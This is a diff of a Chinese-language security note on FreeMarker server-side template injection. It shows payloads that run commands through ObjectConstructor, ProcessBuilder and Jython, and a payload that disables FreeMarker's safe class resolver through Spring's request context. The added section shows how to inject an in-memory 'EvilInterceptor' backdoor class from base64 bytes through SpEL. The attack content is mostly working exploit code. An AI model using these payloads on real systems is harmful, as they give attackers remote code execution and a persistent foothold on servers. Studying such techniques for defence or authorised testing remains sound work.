@@ -20,6 +20,8 @@
 </dependency>
 ```
 
+# Intro
+
 * 插值语法
 
 使用插值语法（**interpolation**）来输出数据，即`${...}`
@@ -124,7 +126,7 @@ ${con("java.lang.ProcessBuilder","calc").start()}
 <@value>import os;os.system("calc")</@value>
 ```
 
-## 关闭安全类解析器
+# 关闭安全类解析器
 
 发现`FreeMarkerView`是`AbstractTemplateView`子类，因此我们在模板中可以获取到Spring的宏变量`springMacroRequestContext`，接着获取注册到AOP容器中的`Configuration`模板配置对象，再调用`setNewBuiltinClassResolver`设置类解析器为普通的类解析器。
 
@@ -134,4 +136,14 @@ ${con("java.lang.ProcessBuilder","calc").start()}
 <#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()>
 <#assign VOID=fc.setNewBuiltinClassResolver(dcr)>
 ${"freemarker.template.utility.Execute"?new()("calc")}
+```
+
+# 内存马注入
+
+可以通过Spel表达式来注入
+
+```html
+<#assign con="freemarker.template.utility.ObjectConstructor"?new()>
+<#assign expr="T(org.springframework.cglib.core.ReflectUtils).defineClass('EvilInterceptor',T(org.springframework.util.Base64Utils).decodeFromString('base64ClassBytes'),T(java.lang.Thread).currentThread().getContextClassLoader()).newInstance()">
+${con("org.springframework.expression.spel.standard.SpelExpressionParser").parseExpression(expr).getValue()}
 ```
